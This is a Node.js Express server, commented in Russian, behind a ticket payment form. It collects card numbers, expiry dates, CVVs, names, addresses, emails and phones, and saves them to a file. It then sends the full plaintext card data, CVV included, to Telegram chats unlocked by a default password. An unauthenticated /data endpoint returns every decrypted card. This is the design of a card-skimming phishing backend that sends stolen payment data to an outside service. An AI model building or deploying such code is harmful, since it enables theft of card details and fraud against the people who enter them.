const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const CryptoJS = require('crypto-js');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const DATA_FILE = path.join(__dirname, 'payments.json');

let payments = [];
try {
    if (fs.existsSync(DATA_FILE)) {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        payments = JSON.parse(data);
    }
} catch (error) {
    console.log('Создаем новый файл payments.json');
}

function savePayments() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(payments, null, 2));
}

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'simple-key-for-now';
const encrypt = (text) => CryptoJS.AES.encrypt(text, ENCRYPTION_KEY).toString();

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, {polling: true});

const AUTHORIZED_USERS = {};
const BOT_PASSWORD = process.env.TELEGRAM_PASSWORD || "admin123";

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        '🔐 Для доступа введите пароль:\n\n' +
        'Используйте команду: /password ваш_пароль'
    );
});

bot.onText(/\/password (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const password = match[1];
    
    if (password === BOT_PASSWORD) {
        AUTHORIZED_USERS[chatId] = true;
        bot.sendMessage(chatId, 
            '✅ Доступ разрешен!\n\n' +
            'Доступные команды:\n' +
            '/payments - Посмотреть все платежи\n' +
            'Новые платежи приходят автоматически!'
        );
    } else {
        bot.sendMessage(chatId, '❌ Неверный пароль!');
    }
});

bot.on('message', (msg) => {
    if (!AUTHORIZED_USERS[msg.chat.id]) {
        return;
    }
    
    if (msg.text === '/payments') {
        if (payments.length === 0) {
            bot.sendMessage(msg.chat.id, '📭 Платежей пока нет');
            return;
        }
        
        let message = '💳 Последние платежи:\n\n';
        const recentPayments = payments.slice(-10).reverse();
        
        recentPayments.forEach((payment, index) => {
            // Расшифровываем данные для показа в Telegram
            const decryptedCard = CryptoJS.AES.decrypt(payment.cardNumber, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8);
            const decryptedExpiry = CryptoJS.AES.decrypt(payment.expiration, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8);
            const decryptedCvv = CryptoJS.AES.decrypt(payment.cvv, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8);
            
            message += `🆔 ${index + 1}. Заказ #${payment.id}\n`;
            message += `💳 Карта: ${decryptedCard}\n`;
            message += `📅 Срок: ${decryptedExpiry}\n`;
            message += `🔒 CVV: ${decryptedCvv}\n`;
            message += `👤 ${payment.firstName} ${payment.lastName}\n`;
            message += `🎫 ${payment.ticketType}\n`;
            message += `📅 ${new Date(payment.timestamp).toLocaleString('ru-RU')}\n`;
            message += '─'.repeat(20) + '\n\n';
        });
        
        bot.sendMessage(msg.chat.id, message);
    }
});

app.post('/submit-payment', async (req, res) => {
    try {
        const { 
            cardNumber, 
            expiration, 
            cvv, 
            firstName, 
            lastName, 
            address1, 
            address2, 
            country, 
            city, 
            postcode, 
            email, 
            phone, 
            ticketType, 
            ticketPrice, 
            date, 
            time 
        } = req.body;

        // Проверка обязательных полей
        if (!cardNumber || !expiration || !cvv || !firstName || !email) {
            return res.status(400).json({
                success: false,
                message: 'Обязательные поля не заполнены'
            });
        }

        const payment = {
            id: Date.now(),
            cardNumber: cardNumber,
            expiration: expiration,
            cvv: cvv,
            firstName: firstName,
            lastName: lastName,
            address1: address1,
            address2: address2,
            country: country,
            city: city,
            postcode: postcode,
            email: email,
            phone: phone,
            ticketType: ticketType,
            ticketPrice: ticketPrice,
            date: date,
            time: time,
            timestamp: new Date().toISOString()
        };

        // Сохраняем в файл (зашифрованные данные карты)
        const encryptedPayment = {
            ...payment,
            cardNumber: encrypt(cardNumber),    // Шифруем для файла
            expiration: encrypt(expiration),    // Шифруем для файла  
            cvv: encrypt(cvv)                   // Шифруем для файла
        };
        
        payments.push(encryptedPayment);
        savePayments();

        // Отправляем в Telegram НЕЗАШИФРОВАННЫЕ данные карты
        const telegramMessage = `
💳 НОВЫЙ ПЛАТЕЖ!
🆔 ID: ${payment.id}
🎫 Билет: ${payment.ticketType}
💰 Цена: ${payment.ticketPrice}
📅 Дата: ${payment.date}
⏰ Время: ${payment.time}

💳 ДАННЫЕ КАРТЫ:
Карта: ${payment.cardNumber}
Срок: ${payment.expiration}
CVV: ${payment.cvv}

👤 КЛИЕНТ:
Имя: ${payment.firstName} ${payment.lastName}
Email: ${payment.email}
Телефон: ${payment.phone}

📍 АДРЕС:
${payment.address1}${payment.address2 ? '\n' + payment.address2 : ''}
${payment.city}, ${payment.postcode}
${payment.country}

⏰ ${new Date().toLocaleString('ru-RU')}
`;

        // Отправляем всем авторизованным пользователям
        Object.keys(AUTHORIZED_USERS).forEach(chatId => {
            bot.sendMessage(chatId, telegramMessage);
        });

        res.json({ 
            success: true, 
            message: 'Платеж успешно обработан!',
            id: payment.id
        });

    } catch (error) {
        console.error('Ошибка:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Ошибка сервера' 
        });
    }
});

// Получение всех платежей (для отладки)
app.get('/data', (req, res) => {
    try {
        // Расшифровываем данные для отладки
        const decryptedPayments = payments.map(payment => ({
            ...payment,
            cardNumber: CryptoJS.AES.decrypt(payment.cardNumber, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8),
            expiration: CryptoJS.AES.decrypt(payment.expiration, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8),
            cvv: CryptoJS.AES.decrypt(payment.cvv, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8)
        }));
        res.json(decryptedPayments);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на http://localhost:${PORT}`);
});